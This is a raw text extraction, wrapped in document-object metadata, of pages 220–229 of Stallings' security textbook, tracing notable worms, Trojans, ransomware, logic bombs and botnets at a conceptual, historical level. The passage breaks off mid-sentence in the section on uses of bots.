       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 221, 'page_label': '220'}, page_content='220  CHAPTER 6 / MAliCiouS SofTwARE\\ntook only three days for Melissa to infect over 100,000 computers, compared to the \\nmonths it took the Brain virus to infect a few thousand computers a decade before. \\nThis makes it very difficult for anti-virus software to respond to new attacks before \\nmuch damage is done.\\nThe Code Red worm first appeared in July 2001. Code Red exploits a security \\nhole in the Microsoft Internet Information Server (IIS) to penetrate and spread. It also \\ndisables the system file checker in Windows. The worm probes random IP\\xa0addresses \\nto spread to other hosts. During a certain period of time, it only spreads. It then initi-\\nates a denial-of-service attack against a government website by flooding the site with \\npackets from numerous hosts. The worm then suspends activities and reactivates \\nperiodically. In the second wave of attack, Code Red infected nearly 360,000 serv -\\ners in 14 hours. In addition to the havoc it caused at the targeted server, Code Red \\nconsumed enormous amounts of Internet capacity, disrupting service [MOOR02].\\nCode Red II is another distinct variant that first appeared in August 2001, \\nand also targeted Microsoft IIS. It tried to infect systems on the same subnet as the \\ninfected system. Also, this newer worm installs a backdoor, allowing a hacker to \\nremotely execute commands on victim computers.\\nThe Nimda worm that appeared in September 2001 also has worm, virus, and \\nmobile code characteristics. It spread using a variety of distribution methods:\\n• E-mail: A user on a vulnerable host opens an infected e-mail attachment; \\nNimda looks for e-mail addresses on the host then sends copies of itself to \\nthose addresses.\\n• Windows shares: Nimda scans hosts for unsecured Windows file shares; it can \\nthen use NetBIOS86 as a transport mechanism to infect files on that host in \\nthe hopes that a user will run an infected file, which will activate Nimda on \\nthat host.\\n• Web servers: Nimda scans Web servers, looking for known vulnerabilities in \\nMicrosoft IIS. If it finds a vulnerable server, it attempts to transfer a copy of \\nitself to the server and infects it and its files.\\n• Web clients: If a vulnerable Web client visits a Web server that has been infected \\nby Nimda, the client’s workstation will become infected.\\n• Backdoors: If a workstation was infected by earlier worms, such as “Code Red \\nII,” then Nimda will use the backdoor access left by these earlier infections to \\naccess the system.\\nIn early 2003, the SQL Slammer worm appeared. This worm exploited a buffer \\noverflow vulnerability in Microsoft SQL server. The Slammer was extremely compact \\nand spread rapidly, infecting 90% of vulnerable hosts within 10 minutes. This rapid \\nspread caused significant congestion on the Internet.\\nLate 2003 saw the arrival of the Sobig.F worm, which exploited open proxy \\nservers to turn infected machines into spam engines. At its peak, Sobig.F reportedly \\naccounted for one in every 17 messages and produced more than one million copies \\nof itself within the first 24 hours.\\nMydoom is a mass-mailing e-mail worm that appeared in 2004. It followed the \\ngrowing trend of installing a backdoor in infected computers, thereby enabling hack-\\ners to gain remote access to data such as passwords and credit card numbers. Mydoom \\nM06_STAL0611_04_GE_C06.indd   220 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 222, 'page_label': '221'}, page_content='6.4 / PRoPAGATioN—VulNERABiliTY EXPloiT—woRMS  221\\nreplicated up to 1,000 times per minute and reportedly flooded the Internet with 100 \\nmillion infected messages in 36 hours.\\nThe Warezov family of worms appeared in 2006 [KIRK06]. When the worm \\nis launched, it creates several executables in system directories and sets itself to run \\nevery time Windows starts by creating a registry entry. Warezov scans several types \\nof files for e-mail addresses and sends itself as an e-mail attachment. Some variants \\nare capable of downloading other malware, such as Trojan horses and adware. Many \\nvariants disable security-related products and/or disable their updating capability.\\nThe Conficker (or Downadup) worm was first detected in November 2008 and \\nspread quickly to become one of the most widespread infections since SQL Slammer \\nin 2003 [LAWT09]. It spread initially by exploiting a Windows buffer overflow vulner-\\nability, though later versions could also spread via USB drives and network file shares. \\nRecently, it still comprised the second most common family of malware observed by \\nSymantec [SYMA16], even though patches were available from Microsoft to close \\nthe main vulnerabilities it exploits.\\nIn 2010, the Stuxnet worm was detected, though it had been spreading quietly \\nfor some time previously [CHEN11, KUSH13]. Unlike many previous worms, it delib-\\nerately restricted its rate of spread to reduce its chance of detection. It also targeted \\nindustrial control systems, most likely those associated with the Iranian nuclear pro-\\ngram, with the likely aim of disrupting the operation of their equipment. It supported \\na range of propagation mechanisms, including via USB drives, network file shares, \\nand using no less than four unknown, zero-day vulnerability exploits. Considerable \\ndebate resulted from the size and complexity of its code, the use of an unprecedented \\nfour zero-day exploits, and the cost and effort apparent in its development. There are \\nclaims that it appears to be the first serious use of a cyberwarfare weapon against \\na nation’s physical infrastructure. The researchers who analyzed Stuxnet noted that \\nwhile they were expecting to find espionage, they never expected to see malware with \\ntargeted sabotage as its aim. As a result, greater attention is now being directed at the \\nuse of malware as a weapon by a number of nations.\\nIn late 2011, the Duqu worm was discovered, which uses code related to that in \\nStuxnet. Its aim is different, being cyber-espionage, though it appears to also target \\nthe Iranian nuclear program. Another prominent, recent, cyber-espionage worm is \\nthe Flame family, which was discovered in 2012 and appears to target Middle-Eastern \\ncountries. Despite the specific target areas for these various worms, their infection \\nstrategies have been so successful that they have been identified on computer systems \\nin a very large number of countries, including on systems kept physically isolated \\nfrom the general Internet. This reinforces the need for significantly improved coun-\\ntermeasures to resist such infections.\\nIn May 2017 , the WannaCry ransomware attack spread extremely rapidly over a \\nperiod of hours to days, infecting hundreds of thousands of systems belonging to both \\npublic and private organisations in more than 150 countries (US-CERT Alert TA17-\\n132A) [GOOD17]. It spread as a worm by aggressively scanning both local and random \\nremote networks, attempting to exploit a vulnerability in the SMB file sharing service on \\nunpatched Windows systems. This rapid spread was only slowed by the accidental activa-\\ntion of a “kill-switch” domain by a UK security researcher, whose existence was checked \\nfor in the initial versions of this malware. Once installed on infected systems, it also \\nencrypted files, demanding a ransom payment to recover them, as we will discuss later.\\nM06_STAL0611_04_GE_C06.indd   221 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 223, 'page_label': '222'}, page_content='222  CHAPTER 6 / MAliCiouS SofTwARE\\nState of Worm Technology\\nThe state of the art in worm technology includes the following:\\n• Multiplatform: Newer worms ar e not limited to Windows machines but can \\nattack a variety of platforms, especially the popular varieties of UNIX; or \\nexploit macro or scripting languages supported in popular document types.\\n• Multi-exploit: New worms penetrate systems in a variety of ways, using exploits \\nagainst Web servers, browsers, e-mail, file sharing, and other network-based \\napplications; or via shared media.\\n• Ultrafast spreading: Exploit various techniques to optimize the rate of spread \\nof a worm to maximize its likelihood of locating as many vulnerable machines \\nas possible in a short time period.\\n• Polymorphic: To evade detection, skip past filters, and foil real-time analysis, \\nworms adopt virus polymorphic techniques. Each copy of the worm has new \\ncode generated on the fly using functionally equivalent instructions and encryp-\\ntion techniques.\\n• Metamorphic: In addition to changing their appearance, metamorphic worms \\nhave a repertoire of behavior patterns that are unleashed at different stages of \\npropagation.\\n• Transport vehicles: Because worms can rapidly compromise a large number \\nof systems, they are ideal for spreading a wide variety of malicious payloads, \\nsuch as distributed denial-of-service bots, rootkits, spam e-mail generators, and \\nspyware.\\n• Zero-day exploit: To achieve maximum surprise and distribution, a worm should \\nexploit an unknown vulnerability that is only discovered by the general network \\ncommunity when the worm is launched. In 2015, 54 zero-day exploits were \\ndiscovered and exploited, significantly more than in previous years [SYMA16]. \\nMany of these were in common computer and mobile software. Some, though, \\nwere in common libraries and development packages, and some in industrial \\ncontrol systems. This indicates the range of systems being targeted.\\nMobile Code\\nNIST SP 800-28 (Guidelines on Active Content and Mobile Code, March 2008) defines \\nmobile code as programs (e.g., script, macro, or other portable instruction) that can \\nbe shipped unchanged to a heterogeneous collection of platforms and executed with \\nidentical semantics.\\nMobile code is transmitted from a remote system to a local system then executed \\non the local system without the user’s explicit instruction. Mobile code often acts as a \\nmechanism for a virus, worm, or Trojan horse to be transmitted to the user’s worksta-\\ntion. In other cases, mobile code takes advantage of  vulnerabilities to perform its own \\nexploits, such as unauthorized data access or root compromise. Popular vehicles for \\nmobile code include Java applets, ActiveX, Java Script, and VBScript. The most common \\nmethods of using mobile code for malicious operations on local system are cross-site \\nscripting, interactive and dynamic websites, e-mail attachments, and downloads from \\nuntrusted sites or of untrusted software.\\nM06_STAL0611_04_GE_C06.indd   222 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 224, 'page_label': '223'}, page_content='6.4 / PRoPAGATioN—VulNERABiliTY EXPloiT—woRMS  223\\nMobile Phone Worms\\nWorms first appeared on mobile phones with the discovery of the Cabir worm in \\n2004, then Lasco and CommWarrior in 2005. These worms communicate through \\nBluetooth wireless connections or via the multimedia messaging service (MMS). \\nThe\\xa0target is the smartphone, which is a mobile phone that permits users to install \\nsoftware applications from sources other than the cellular network operator. All these \\nearly mobile worms targeted mobile phones using the Symbian operating system. \\nMore recent malware targets Android and iPhone systems. Mobile phone malware \\ncan completely disable the phone, delete data on the phone, or force the device to \\nsend costly messages to premium-priced numbers.\\nThe CommWarrior worm replicates by means of Bluetooth to other phones \\nin the receiving area. It also sends itself as an MMS file to numbers in the phone’s \\naddress book and in automatic replies to incoming text messages and MMS messages. \\nIn addition, it copies itself to the removable memory card and inserts itself into the \\nprogram installation files on the phone.\\nAlthough these examples demonstrate that mobile phone worms are possible, \\nthe vast majority of mobile phone malware observed use trojan apps to install them-\\nselves [SYMA16].\\nClient-Side Vulnerabilities and Drive-by-Downloads\\nAnother approach to exploiting software vulnerabilities involves the exploit of bugs \\nin user applications to install malware. A common technique exploits browser and \\nplugin vulnerabilities so when the user views a webpage controlled by the attacker, \\nit contains code that exploits the bug to download and install malware on the system \\nwithout the user’s knowledge or consent. This is known as a drive-by-download and \\nis a common exploit in recent attack kits. Multiple vulnerabilities in the Adobe Flash \\nPlayer and Oracle Java plugins have been exploited by attackers over many years, to \\nthe point where many browsers are now removing support for them. In most cases, this \\nmalware does not actively propagate as a worm does, but rather waits for unsuspecting \\nusers to visit the malicious webpage in order to spread to their systems [SYMA16].\\nIn general, drive-by-download attacks are aimed at anyone who visits a compro-\\nmised site and is vulnerable to the exploits used. Watering-hole attacks are a variant \\nof this used in highly targeted attacks. The attacker researches their intended victims \\nto identify websites they are likely to visit, then scans these sites to identify those \\nwith vulnerabilities that allow their compromise with a drive-by-download attack. \\nThey then wait for one of their intended victims to visit one of the compromised sites. \\nTheir attack code may even be written so that it will only infect systems belonging to \\nthe target organization, and take no action for other visitors to the site. This greatly \\nincreases the likelihood of the site compromise remaining undetected.\\nMalvertising is another technique used to place malware on websites without \\nactually compromising them. The attacker pays for advertisements that are highly \\nlikely to be placed on their intended target websites, and which incorporate malware \\nin them. Using these malicious adds, attackers can infect visitors to sites displaying \\nthem. Again, the malware code may be dynamically generated to either reduce the \\nchance of detection, or to only infect specific systems. Malvertising has grown rapidly \\nin recent years, as they are easy to place on desired websites with few questions asked, \\nM06_STAL0611_04_GE_C06.indd   223 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 225, 'page_label': '224'}, page_content='224  CHAPTER 6 / MAliCiouS SofTwARE\\nand are hard to track. Attackers have placed these ads for as little as a few hours, \\nwhen they expect their intended victims could be browsing the targeted websites, \\ngreatly reducing their visibility [SYMA16].\\nOther malware may target common PDF viewers to also download and install \\nmalware without the user’s consent when they view a malicious PDF document \\n[STEV11]. Such documents may be spread by spam e-mail, or be part of a targeted \\nphishing attack, as we will discuss in the next section.\\nClickjacking\\nClickjacking, also known as a user-interface (UI) redress attack, is a vulnerability used \\nby an attacker to collect an infected user’s clicks. The attacker can force the user \\nto do a variety of things from adjusting the user’s computer settings to unwittingly \\nsending the user to websites that might have malicious code. Also, by taking advan-\\ntage of Adobe Flash or JavaScript, an attacker could even place a button under or \\nover a legitimate button, making it difficult for users to detect. A typical attack uses \\nmultiple transparent or opaque layers to trick a user into clicking on a button or link \\non another page when they were intending to click on the top level page. Thus, the \\nattacker is hijacking clicks meant for one page and routing them to another page, \\nmost likely owned by another application, domain, or both.\\nUsing a similar technique, keystrokes can also be hijacked. With a carefully \\ncrafted combination of stylesheets, iframes, and text boxes, a user can be led to believe \\nthey are typing in the password to their e-mail or bank account, but are instead typing \\ninto an invisible frame controlled by the attacker.\\nThere is a wide variety of techniques for accomplishing a clickjacking attack, \\nand new techniques are developed as defenses to older techniques are put in place. \\n[NIEM11] and [STON10] are useful discussions.\\n 6.5 PROPAGATION—SOCIAL ENGINEERING—SPAM E-MAIL, \\nTROJANS\\nThe final category of malware propagation we consider involves social engineering, \\n“tricking” users to assist in the compromise of their own systems or personal informa-\\ntion. This can occur when a user views and responds to some SPAM e-mail, or permits \\nthe installation and execution of some Trojan horse program or scripting code.\\nSpam (Unsolicited Bulk) E-Mail\\nWith the explosive growth of the Internet over the last few decades, the widespread \\nuse of e-mail, and the extremely low cost required to send large volumes of e-mail, has \\ncome the rise of unsolicited bulk e-mail, commonly known as spam. [SYMA16] notes \\nthat more than half of inbound business e-mail traffic is still spam, despite a gradual \\ndecline in recent years. This imposes significant costs on both the network infrastruc-\\nture needed to relay this traffic, and on users who need to filter their legitimate e-mails \\nout of this flood. In response to this explosive growth, there has been the equally rapid \\ngrowth of the anti-spam industry that provides products to detect and filter spam \\ne-mails. This has led to an arms race between the spammers devising techniques to \\nsneak their content through, and with the defenders, efforts to block them [KREI09].\\nM06_STAL0611_04_GE_C06.indd   224 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 226, 'page_label': '225'}, page_content='6.5 / PRoPAGATioN—SoCiAl ENGiNEERiNG—SPAM E-MAil, TRoJANS  225\\nHowever, the spam problem continues, as spammers exploit other means of \\nreaching their victims. This includes the use of social media, reflecting the rapid growth \\nin the use of these networks. For example, [SYMA16] described a successful weight-\\nloss spam campaign that exploited hundreds of thousands of fake Twitter accounts, \\nmutually supporting and reinforcing each other, to increase their credibility and likeli-\\nhood of users following them, and then falling for the scam. Social network scams often \\nrely on victims sharing the scam, or on fake offers with incentives, to assist their spread.\\nWhile some spam e-mail is sent from legitimate mail servers using stolen user \\ncredentials, most recent spam is sent by botnets using compromised user systems, \\nas we will discuss in Section 6.6. A significant portion of spam e-mail content is just \\nadvertising, trying to convince the recipient to purchase some product online, such \\nas pharmaceuticals, or used in scams, such as stock, romance or fake trader scams, or \\nmoney mule job ads. But spam is also a significant carrier of malware. The e-mail may \\nhave an attached document, which, if opened, may exploit a software vulnerability \\nto install malware on the user’s system, as we discussed in the previous section. Or, it \\nmay have an attached Trojan horse program or scripting code that, if run, also installs \\nmalware on the user’s system. Some Trojans avoid the need for user agreement by \\nexploiting a software vulnerability in order to install themselves, as we will discuss \\nnext. Finally the spam may be used in a phishing attack, typically directing the user \\neither to a fake website that mirrors some legitimate service, such as an online bank-\\ning site, where it attempts to capture the user’s login and password details; or to com-\\nplete some form with sufficient personal details to allow the attacker to impersonate \\nthe user in an identity theft. In recent years, the evolving criminal marketplace makes \\nphishing campaigns easier by selling packages to scammers that largely automate the \\nprocess of running the scam [SYMA16]. All of these uses make spam e-mails a sig -\\nnificant security concern. However, in many cases, it requires the user’s active choice \\nto view the e-mail and any attached document, or to permit the installation of some \\nprogram, in order for the compromise to occur. Hence the importance of providing \\nappropriate security awareness training to users, so they are better able to recognize \\nand respond appropriately to such e-mails, as we will discuss in Chapter 17 .\\nTrojan Horses\\nA Trojan horse2 is a useful, or apparently useful, program or utility containing hidden \\ncode that, when invoked, performs some unwanted or harmful function.\\nTrojan horse programs can be used to accomplish functions indirectly that the \\nattacker could not accomplish directly. For example, to gain access to sensitive, per-\\nsonal information stored in the files of a user, an attacker could create a Trojan \\nhorse program that, when executed, scans the user’s files for the desired sensitive \\ninformation and sends a copy of it to the attacker via a webform or e-mail or text \\nmessage. The author could then entice users to run the program by incorporating it \\ninto a game or useful utility program, and making it available via a known software \\n2In Greek mythology, the Trojan horse was used by the Greeks during their siege of Troy. Epeios con -\\nstructed a giant hollow wooden horse in which 30 of the most valiant Greek heroes concealed themselves. \\nThe rest of the Greeks burned their encampment and pretended to sail away but actually hid nearby. \\nThe Trojans, convinced the horse was a gift and the siege over, dragged the horse into the city. That night, \\nthe Greeks emerged from the horse and opened the city gates to the Greek army. A bloodbath ensued, \\n resulting in the destruction of Troy and the death or enslavement of all its citizens.\\nM06_STAL0611_04_GE_C06.indd   225 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 227, 'page_label': '226'}, page_content='226  CHAPTER 6 / MAliCiouS SofTwARE\\ndistribution site or app store. This approach has been used recently with utilities that \\n“claim” to be the latest anti-virus scanner, or security update, for systems, but which \\nare actually malicious Trojans, often carrying payloads such as spyware that searches \\nfor banking credentials. Hence, users need to take precautions to validate the source \\nof any software they install.\\nTrojan horses fit into one of three models:\\n• Continuing to perform the function of the original progr am and additionally \\nperforming a separate malicious activity.\\n• Continuing to perform the function of the original program but modifying the \\nfunction to perform malicious activity (e.g., a Trojan horse version of a login \\nprogram that collects passwords) or to disguise other malicious activity (e.g., a \\nTrojan horse version of a process listing program that does not display certain \\nprocesses that are malicious).\\n• Performing a malicious function that completely r eplaces the function of the \\noriginal program.\\nSome Trojans avoid the requirement for user assistance by exploiting some software \\nvulnerability to enable their automatic installation and execution. In this, they share \\nsome features of a worm, but unlike it, they do not replicate. A prominent example \\nof such an attack was the Hydraq Trojan used in Operation Aurora in 2009 and early \\n2010. This exploited a vulnerability in Internet Explorer to install itself, and targeted \\nseveral high-profile companies. It was typically distributed using either spam e-mail or \\nvia a compromised website using a “watering-hole” attack. Tech Support Scams are a \\ngrowing social engineering concern. These involve call centers calling users about non-\\nexistent problems on their computer systems. If the users respond, the attackers try to \\nsell them bogus tech support or ask them to install Trojan malware or other unwanted \\napplications on their systems, all while claiming this will fix their problem [SYMA16].\\nMobile Phone Trojans\\nMobile phone Trojans also first appeared in 2004 with the discovery of Skuller. As \\nwith mobile worms, the target is the smartphone, and the early mobile Trojans tar -\\ngeted Symbian phones. More recently, a significant number of Trojans have been \\ndetected that target Android phones and Apple iPhones. These Trojans are usually \\ndistributed via one or more of the app marketplaces for the target phone O/S.\\nThe rapid growth in smartphone sales and use, which increasingly contain valu-\\nable personal information, make them an attractive target for criminals and other \\nattackers. Given five in six new phones run Android, they are a key target [SYMA16]. \\nThe number of vulnerabilities discovered in, and malware families targeting these \\nphones, have both increased steadily in recent years. Recent examples include a \\nphishing Trojan that tricks the user into entering their banking details, and ransom-\\nware that mimics Google’s design style to appear more legitimate and intimidating.\\nThe tighter controls that Apple impose on their app store, mean that many \\niPhone Trojans target “jail-broken” phones, and are distributed via unofficial sites. \\nHowever a number of versions of the iPhone O/S contained some form of graphic \\nor PDF vulnerability. Indeed these vulnerabilities were the main means used to “jail-\\nbreak” the phones. But they also provided a path that malware could use to target \\nthe phones. While Apple has fixed a number of these vulnerabilities, new variants \\nM06_STAL0611_04_GE_C06.indd   226 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 228, 'page_label': '227'}, page_content='6.6 / PAYloAD—SYSTEM CoRRuPTioN  227\\ncontinued to be discovered. This is yet another illustration of just how difficult it is, for \\neven well- resourced organizations, to write secure software within a complex system, \\nsuch as an operating system. We will return to this topic in Chapters 10 and 11. More \\nrecently in 2015, XcodeGhost malware was discovered in a number of legitimate \\nApple Store apps. The apps were not intentionally designed to be malicious, but their \\ndevelopers used a compromised Xcode development system that covertly installed \\nthe malware as the apps were created [SYMA16]. This is one of several examples \\nof attackers exploiting the development or enterprise provisioning infrastructure to \\nassist malware distribution.\\n 6.6 PAYLOAD—SYSTEM CORRUPTION\\nOnce malware is active on the target system, the next concern is what actions it \\nwill take on this system. That is, what payload does it carry? Some malware has a \\nnonexistent or nonfunctional payload. Its only purpose, either deliberate or due to \\naccidental early release, is to spread. More commonly, it carries one or more payloads \\nthat perform covert actions for the attacker.\\nAn early payload seen in a number of viruses and worms resulted in data destruc-\\ntion on the infected system when certain trigger conditions were met [WEA V03]. A \\nrelated payload is one that displays unwanted messages or content on the user’s system \\nwhen triggered. More seriously, another variant attempts to inflict real-world dam -\\nage on the system. All of these actions target the integrity of the computer system’s \\nsoftware or hardware, or of the user’s data. These changes may not occur immediately, \\nbut only when specific trigger conditions are met that satisfy their logic-bomb code.\\nData Destruction and Ransomware\\nThe Chernobyl virus is an early example of a destructive parasitic memory-resident \\nWindows-95 and 98 virus, which was first seen in 1998. It infects executable files \\nwhen they are opened. And when a trigger date is reached, the virus deletes data on \\nthe infected system by overwriting the first megabyte of the hard drive with zeroes, \\nresulting in massive corruption of the entire file system. This first occurred on April \\n26, 1999, when estimates suggest more than one million computers were affected.\\nSimilarly, the Klez mass-mailing worm is an early example of a destructive \\nworm infecting Windows-95 to XP systems, and was first seen in October 2001. It \\nspreads by e-mailing copies of itself to addresses found in the address book and in \\nfiles on the system. It can stop and delete some anti-virus programs running on the \\nsystem. On trigger dates, being the 13th of several months each year, it causes files \\non the local hard drive to become empty.\\nAs an alternative to just destroying data, some malware encrypts the user’s \\ndata, and demands payment in order to access the key needed to recover this infor-\\nmation. This is known as ransomware. The PC Cyborg Trojan seen in 1989 was an \\nearly example of this. However, around mid-2006, a number of worms and  Trojans \\nappeared, such as the Gpcode Trojan, that used public-key cryptography with increas-\\ningly larger key sizes to encrypt data. The user needed to pay a ransom, or to make \\na purchase from certain sites, in order to receive the key to decrypt this data. While \\nearlier instances used weaker cryptography that could be cracked without paying the \\nM06_STAL0611_04_GE_C06.indd   227 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 229, 'page_label': '228'}, page_content='228  CHAPTER 6 / MAliCiouS SofTwARE\\nransom, the later versions using public-key cryptography with large key sizes could \\nnot be broken this way. [SYMA16, VERI16] note that ransomware is a growing chal-\\nlenge, comprising one of the most common types of malware installed on systems, \\nand is often spread via “drive-by-downloads” or via SPAM e-mails.\\nThe WannaCry ransomware, that we mentioned earlier in our discussion of \\nWorms, infected a large number of systems in many countries in May 2017 . When \\ninstalled on infected systems, it encrypted a large number of files matching a list of \\nparticular file types, and then demanded a ransom payment in Bitcoins to recover \\nthem. Once this had occurred, recovery of this information was generally only possible \\nif the organization had good backups, and an appropriate incident response and disas-\\nter recovery plan, as we will discuss in Chapter 17 . The WannaCry ransomware attack \\ngenerated a significant amount of media attention, in part due to the large number of \\naffected organizations, and the significant costs they incurred in recovering from it. The \\ntargets for these attacks have widened beyond personal computer systems to include \\nmobile devices and Linux servers. And tactics such as threatening to publish sensi -\\ntive personal information, or to permanently destroy the encryption key after a short \\nperiod of time, are sometimes used to increase the pressure on the victim to pay up.\\nReal-World Damage\\nA further variant of system corruption payloads aims to cause damage to physi -\\ncal equipment. The infected system is clearly the device most easily targeted. The \\n Chernobyl virus mentioned above not only corrupts data, but attempts to rewrite the \\nBIOS code used to initially boot the computer. If it is successful, the boot process fails, \\nand the system is unusable until the BIOS chip is either re-programmed or replaced.\\nMore recently, the Stuxnet worm that we discussed previously targets some \\nspecific industrial control system software as its key payload [CHEN11, KUSH13]. \\nIf control systems using certain Siemens industrial control software with a specific \\nconfiguration of devices are infected, then the worm replaces the original control \\ncode with code that deliberately drives the controlled equipment outside its normal \\noperating range, resulting in the failure of the attached equipment. The centrifuges \\nused in the Iranian uranium enrichment program were strongly suspected as the tar-\\nget, with reports of much higher than normal failure rates observed in them over the \\nperiod when this worm was active. As noted in our earlier discussion, this has raised \\nconcerns over the use of sophisticated targeted malware for industrial sabotage.\\nThe British Government’s 2015 Security and Defense Review noted their \\n growing concerns over the use of c yber attacks against critical infrastructure by \\nboth state-sponsored and non state actors. The December 2015 attack that disrupted \\nUkrainian power systems shows these concerns are well-founded, given that much \\ncritical infrastructure is not sufficiently hardened to resist such attacks [SYMA16].\\nLogic Bomb\\nA key component of data-corrupting malware is the logic bomb. The logic bomb is \\ncode embedded in the malware that is set to “explode” when certain conditions are \\nmet. Examples of conditions that can be used as triggers for a logic bomb are the \\npresence or absence of certain files or devices on the system, a particular day of the \\nweek or date, a particular version or configuration of some software, or a particular \\nM06_STAL0611_04_GE_C06.indd   228 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 230, 'page_label': '229'}, page_content='6.7 / PAYloAD—ATTACK AGENT—ZoMBiE, BoTS  229\\nuser running the application. Once triggered, a bomb may alter or delete data or \\nentire files, cause a machine to halt, or do some other damage.\\nA striking example of how logic bombs can be employed was the case of Tim \\nLloyd, who was convicted of setting a logic bomb that cost his employer, Omega \\nEngineering, more than $10 million, derailed its corporate growth strategy, and even-\\ntually led to the layoff of 80 workers [GAUD00]. Ultimately, Lloyd was sentenced to \\n41 months in prison and ordered to pay $2 million in restitution.\\n 6.7 PAYLOAD—ATTACK AGENT—ZOMBIE, BOTS\\nThe next category of payload we discuss is where the malware subverts the compu -\\ntational and network resources of the infected system for use by the attacker. Such \\na system is known as a bot (robot), zombie or drone, and secretly takes over another \\nInternet-attached computer then uses that computer to launch or manage attacks that \\nare difficult to trace to the bot’s creator. The bot is typically planted on hundreds or \\nthousands of computers belonging to unsuspecting third parties. The compromised \\nsystems are not just personal computers, but include servers, and recently embedded \\ndevices such as routers or surveillance cameras. The collection of bots often is capable \\nof acting in a coordinated manner; such a collection is referred to as a botnet. This \\ntype of payload attacks the integrity and availability of the infected system.\\nUses of Bots\\n[HONE05] lists the following uses of bots:\\n• Distributed denial-of-service (DDoS) attacks: A DDoS attack is an attack on \\na computer system or network that causes a loss of service to users. We will \\nexamine DDoS attacks in Chapter 7 .\\n• Spamming: With the help of a botnet and thousands of bots, an attacker is able \\nto send massive amounts of bulk e-mail (spam).\\n• Sniffing traffic: Bots can also use a packet sniffer to watch for interesting clear-\\ntext data passing by a compromised machine. The sniffers are mostly used to \\nretrieve sensitive information like usernames and passwords.\\n• Keylogging: If the compromised machine uses encrypted communication chan-\\nnels (e.g., HTTPS or POP3S), then just sniffing the network packets on the \\nvictim’s computer is useless because the appropriate key to decrypt the packets \\nis missing. But by using a keylogger, which captures keystrokes on the infected \\nmachine, an attacker can retrieve sensitive 